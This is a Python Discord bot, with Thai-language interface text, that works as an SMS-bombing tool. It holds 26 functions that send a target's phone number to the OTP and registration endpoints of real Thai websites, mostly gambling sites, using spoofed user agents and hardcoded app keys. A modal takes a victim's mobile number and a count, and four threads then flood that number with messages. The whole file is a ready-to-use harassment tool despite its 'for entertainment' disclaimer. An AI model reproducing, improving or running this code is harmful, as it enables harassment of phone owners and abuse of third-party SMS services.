import discord
from discord.ext import commands
from discord import ui, ButtonStyle, Interaction
import threading
import requests
import phonenumbers
import random
import time
from fake_useragent import UserAgent
import asyncio

TOKEN = "YOUR_DISCORD_BOT_TOKEN"  # <--- เปลี่ยนตรงนี้

ua = UserAgent()

# ==== รวมทุก API (1-26) ====
def api1(phone):
    url = "https://gogo-shop.com/app/index/send_sms"
    headers = {"Host": "gogo-shop.com","User-Agent": ua.random,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://gogo-shop.com","Referer": "https://gogo-shop.com/app/index/register?username=39014291"}
    data = f"type=1&telephone={phone}&select=66"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200 and '"code":1' in response.text
    except: return False

def api2(phone):
    url = f"https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}"
    headers = {"Appid": "Website_Api","Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/", "User-Agent": ua.random}
    try:
        response = requests.post(url, headers=headers, timeout=10)
        return response.status_code == 200 and '"code":200' in response.text
    except: return False

def api3(phone):
    url = "https://jaomuehuay.io/api/auth/send-otp"
    headers = {"Host": "jaomuehuay.io","User-Agent": ua.random,"Accept": "application/json","Content-Type": "application/json","Origin": "https://jaomuehuay.io","Referer": "https://jaomuehuay.io/register/jaomuehuay"}
    payload = {"phone_number": phone, "affiliateCode": "jaomuehuay", "type": 1}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"Success":true' in response.text
    except: return False

def api4(phone):
    url = "https://www.jut8.com/api/user/request-register-tac"
    headers = {"Host": "www.jut8.com","User-Agent": ua.random,"Accept": "application/json","Content-Type": "application/json","Origin": "https://www.jut8.com","Referer": "https://www.jut8.com/th-th?signup=1"}
    payload = {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": phone, "language": "th", "langCountry": "th-th"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"status":true' in response.text
    except: return False

def api5(phone):
    url = "https://m.cdo888.bet/ajax/submitOTP"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://m.cdo888.bet","Referer": "https://m.cdo888.bet/user/register","User-Agent": ua.random}
    data = f"send_otp={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200 and '"status":"success"' in response.text
    except: return False

def api6(phone):
    url = "https://www.joneslot.me/pussy888/otp.php?m=request"
    headers = {"Host": "www.joneslot.me","User-Agent": ua.random,"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.joneslot.me"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200 and '"status":"success"' in response.text
    except: return False

def api7(phone):
    url = "https://play.swin168.me/api/register/sms"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://play.swin168.me","Referer": "https://play.swin168.me/register/"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200
    except: return False

def api8(phone):
    url = "https://www.johnwick168.me/signup.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.johnwick168.me","Referer": "https://www.johnwick168.me/signup.php","User-Agent": ua.random}
    data = f"act=step-1&tel={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200
    except: return False

def api9(phone):
    url = "https://skyslot7.me/member/otp.php?m=request"
    headers = {"User-Agent": ua.random,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://skyslot7.me","Referer": "https://skyslot7.me/member/register"}
    data = f"phone={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200 and '"status":"success"' in response.text
    except: return False

def api10(phone):
    url = "https://mgi88.me/api/otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://mgi88.me","Referer": "https://mgi88.me/"}
    payload = {"telefon_number": phone, "registrera_typ": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"code":200' in response.text
    except: return False

def api11(phone):
    url = "https://play.dee.casino/api/register/sms"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://play.dee.casino","Referer": "https://play.dee.casino/register"}
    payload = {"phone": phone, "agent_id": 1, "country_code": "TH"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200
    except: return False

def api12(phone):
    url = "https://gw.mgame666.com/AuthAPI/SendSms"
    headers = {"Content-Type": "application/json","Origin": "https://okmega.pgm77.com","Referer": "https://okmega.pgm77.com/","User-Agent": ua.random}
    payload = {"Phone": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200
    except: return False

def api13(phone):
    url = "https://api.prompkai.com/auth/preRegister"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://www.prompkai.com","Referer": "https://www.prompkai.com/"}
    payload = {"username": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"error":false' in response.text
    except: return False

def api14(phone):
    url = "https://www.fun24.bet/_ajax_/v3/register/request-otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/x-www-form-urlencoded","Origin": "https://www.fun24.bet","Referer": "https://www.fun24.bet/สล็อตfun24-เว็บสล็อตที่แตกบ่อยแตกหนัก-แตกง่าย"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200
    except: return False

def api15(phone):
    url = "https://wm78bet.bet/_ajax_/v3/register/request-otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/x-www-form-urlencoded","Origin": "https://wm78bet.bet","Referer": "https://wm78bet.bet/เว็บเกมส์สล็อต"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200
    except: return False

def api16(phone):
    url = "https://m.happy168.xyz/api/otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://m.happy168.xyz","Referer": "https://m.happy168.xyz/?hid=V0H3O1B4TH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"code":200' in response.text
    except: return False

def api17(phone):
    url = "https://pgheng.amaheng.com/api/otp?lang=th"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://pgheng.amaheng.com","Referer": "https://pgheng.amaheng.com/register?hid=T0F1K1A5RC"}
    payload = {"phone_number": phone, "register_type": "", "type_otp": "register"}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"code":200' in response.text
    except: return False

def api18(phone):
    url = "https://www.aplusfun.bet/_ajax_/v3/register/request-otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/x-www-form-urlencoded","Origin": "https://www.aplusfun.bet","Referer": "https://www.aplusfun.bet/spinix-สล็อตออนไลน์เดิมพันสุดมันส์ไม่มีเบื่อ"}
    data = f"phoneNumber={phone}"
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response.status_code == 200
    except: return False

def api19(phone):
    url = "https://api-players.cueu77778887.com/register-otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://lcbet44.electrikora.com","Referer": "https://lcbet44.electrikora.com/","X-Exp-Signature": "62b3e4c0138d8500127860d5","Authorization": "Bearer null"}
    payload = {"brands_id": "62b3e4c0138d8500127860d5", "tel": phone, "token": "","captcha_id": "","lot_number": "","pass_token": "","gen_time": "","captcha_output": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code in (200, 201) and '"message":"ดำเนินการสำเร็จ"' in response.text
    except: return False

def api20(phone):
    url = "https://api.oneforbet.com/auth/player/phone-check"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json; charset=UTF-8","Origin": "https://ohana888.net","Referer": "https://ohana888.net/","X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4","X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"status":"success"' in response.text
    except: return False

def api21(phone):
    url = "https://m.joker123ths.shop/api/otp"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://m.joker123ths.shop","Referer": "https://m.joker123ths.shop/?hid=E0G3S1A4YH"}
    payload = {"phone_number": phone, "register_type": ""}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"code":200' in response.text
    except: return False

def api22(phone):
    url = "https://jklmn23456.com/api/v1/user/phone/verify"
    headers = {"User-Agent": ua.random,"Content-Type": "application/json","Origin": "https://pigspin.org","Referer": "https://pigspin.org/","ip_address": "182.232.78.75"}
    payload = {"phone_number": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        return response.status_code == 200 and '"status":"SUCCESS"' in response.text
    except: return False

def api23(phone):
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://www.i828th.com/api/user/request-register-tac"
    headers = {
        "Host": "www.i828th.com", "Connection": "keep-alive", "domain": "www.i828th.com", "User-Agent": ua.random,
        "accept": "application/json", "content-type": "application/json",
        "Origin": "https://www.i828th.com", "Referer": "https://www.i828th.com/th-th?signup=1"
    }
    data = {
        "uname": f"66{phone}", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": phone, "language": "th", "langCountry": "th-th"
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return response.status_code == 200 and '"code":1' in response.text
    except: return False

def api24(phone):
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://www.thai191.com/api/user/request-register-tac"
    headers = {"user-agent": ua.random,"content-type": "application/json"}
    data = {"sendType": "mobile", "currency": "THB", "country_code": "66", "mobileno": phone, "language": "th", "langCountry": "th-th"}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return r.status_code == 200 and '"code":1' in r.text
    except: return False

def api25(phone):
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://pgs42s.online/api/otp?lang=th"
    headers = {"user-agent": ua.random,"content-type": "application/json"}
    data = {"phone_number": phone, "register_type": "", "type_otp": "register"}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return r.status_code == 200 and '"success"' in r.text
    except: return False

def api26(phone):
    if phone.startswith("+66"): phone = phone[3:]
    elif phone.startswith("66"): phone = phone[2:]
    url = "https://pgsoft.pgslotin.app/api/otp"
    headers = {"user-agent": ua.random,"content-type": "application/json","origin": "https://pgsoft.pgslotin.app", "referer": "https://pgsoft.pgslotin.app/"}
    data = {"phone_number": phone, "register_type": ""}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return r.status_code == 200 and '"success"' in r.text
    except: return False

all_apis = [api1, api2, api3, api4, api5, api6, api7, api8, api9, api10, api11, api12,
            api13, api14, api15, api16, api17, api18, api19, api20, api21, api22,
            api23, api24, api25, api26]

# ==== Utils ====
def clean_phone(phone):
    phone = str(phone).strip()
    if phone.startswith("+66"):
        phone = "0" + phone[3:]
    elif phone.startswith("66"):
        phone = "0" + phone[2:]
    return "".join(filter(str.isdigit, phone))

def is_valid_thai_mobile(phone):
    try:
        parsed = phonenumbers.parse(phone, "TH")
        return (phonenumbers.is_valid_number(parsed) and phonenumbers.number_type(parsed) == phonenumbers.PhoneNumberType.MOBILE)
    except: return False

def send_job(api_funcs, phone, num, results, idx, progress_callback):
    sent = 0
    api_count = len(api_funcs)
    while sent < num:
        api = api_funcs[sent % api_count]
        ok = api(phone)
        try:
            progress_callback(idx, sent + 1, num, ok)
        except Exception:
            pass
        if ok:
            sent += 1
        time.sleep(random.uniform(0.15, 0.45))
    results[idx] = sent

# ==== Discord UI ====
class SmsRequestModal(ui.Modal, title="⚡ ส่ง SMS Bomb"):
    phone = ui.TextInput(
        label="เบอร์โทรศัพท์",
        placeholder="0812345678 หรือ +66812345678",
        required=True
    )
    count = ui.TextInput(
        label="จำนวนที่ต้องการส่ง",
        placeholder="100",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: Interaction):
        raw_phone = self.phone.value
        raw_count = self.count.value

        phone = clean_phone(raw_phone)
        try:
            count_value = int(raw_count)
        except ValueError:
            await interaction.response.send_message("❌ ใส่จำนวนครั้งเป็นตัวเลขเท่านั้น!", ephemeral=True)
            return

        if not is_valid_thai_mobile(phone) or len(phone) != 10:
            await interaction.response.send_message("❌ ใส่เบอร์มือถือไทยถูกต้อง (10 หลัก)", ephemeral=True)
            return

        await interaction.response.send_message(f"⏳ เริ่มส่ง `{count_value}` ครั้งไปที่ **{phone}** ... แบ่ง 4 ส่วน", ephemeral=False)

        num_per_worker = count_value // 4
        remain = count_value % 4
        jobs = [num_per_worker] * 4
        for i in range(remain):
            jobs[i] += 1

        progress = [0] * 4
        result = [0] * 4
        msg = await interaction.channel.send(
            embed=get_progress_embed(phone, count_value, progress, jobs, status_msg="กำลังส่ง... 🔄")
        )
        lock = threading.Lock()

        def progress_callback(idx, done, total, ok):
            with lock:
                progress[idx] = done
                txt = "✅" if ok else "❌"
                try:
                    fut = msg.edit(
                        embed=get_progress_embed(phone, count_value, progress, jobs, status_msg=f"กำลังส่ง... {sum(progress)}/{count_value} {txt}")
                    )
                    asyncio.run_coroutine_threadsafe(fut, interaction.client.loop)
                except Exception:
                    pass

        tasks = []
        for i in range(4):
            random.shuffle(all_apis)
            tasks.append(asyncio.to_thread(send_job, all_apis, phone, jobs[i], result, i, progress_callback))
        await asyncio.gather(*tasks)

        await msg.edit(embed=get_progress_embed(
            phone, count_value, progress, jobs, status_msg="🎉 ส่งเสร็จแล้ว!"
        ))
        await interaction.channel.send(f"🎉 ส่งสำเร็จ {sum(result)}/{count_value} ครั้ง ไปยัง {phone}")

class SmsBannerView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="🚀 เริ่มส่ง SMS", style=ButtonStyle.success, custom_id="start_sms")
    async def start_sms_callback(self, interaction: Interaction, _button: ui.Button):
        await interaction.response.send_modal(SmsRequestModal())

def get_progress_embed(phone, total, progress, per_job, status_msg=""):
    embed = discord.Embed(
        title="💥 SMS Bombing Discord (ครบทุก API ไทย!)",
        description=f"เบอร์: **{phone}**\nจำนวนเป้าหมาย: **{total:,} ครั้ง**\n\n{status_msg}",
        color=0xd72537
    )
    embed.set_thumbnail(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaTI0MmhqOTd6YnhobGs0dXJic2tnYm9tdDFkOXFub2ZiYzlqZ3Q0MSZlcD12MV9naWZzX3NlYXJjaCZjdD1z/qgQUggAC3Pfv687qPC/giphy.gif")
    for i in range(4):
        embed.add_field(
            name=f"ส่วนที่ {i+1} (เป้าหมาย {per_job[i]})",
            value=f"ส่งสำเร็จ: **{progress[i]}**",
            inline=True
        )
    embed.set_footer(text="สร้างด้วยรัก 💗 | @forubxbbd-bot")
    return embed

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"บอทออนไลน์ในชื่อ {bot.user} แล้ว!")
    banner_embed = discord.Embed(
        title="🦾 SMS Bombing Discord Bot",
        description="**บริการนี้เพื่อความบันเทิง กรุณาอย่าใช้กลั่นแกล้งใคร!**\n\nกดปุ่มเพื่อเริ่ม",
        color=0x3bffed)
    banner_embed.set_image(url="https://media.giphy.com/media/jQmVFypWInKCc/giphy.gif")
    for channel in bot.get_all_channels():
        if isinstance(channel, discord.TextChannel):
            try:
                await channel.send(embed=banner_embed, view=SmsBannerView())
                break
            except:
                continue

@bot.command(name="smsbomb")
async def smsbomb(ctx):
    embed = discord.Embed(
        title="🔥 SMS Bomb Banner",
        description="**กดปุ่มด้านล่างนี้เพื่อเริ่มใช้งาน!**",
        color=0xffba40
    )
    embed.set_image(url="https://media.giphy.com/media/9fuvOqZ8tbZOU/giphy.gif")
    await ctx.send(embed=embed, view=SmsBannerView())

bot.run(TOKEN)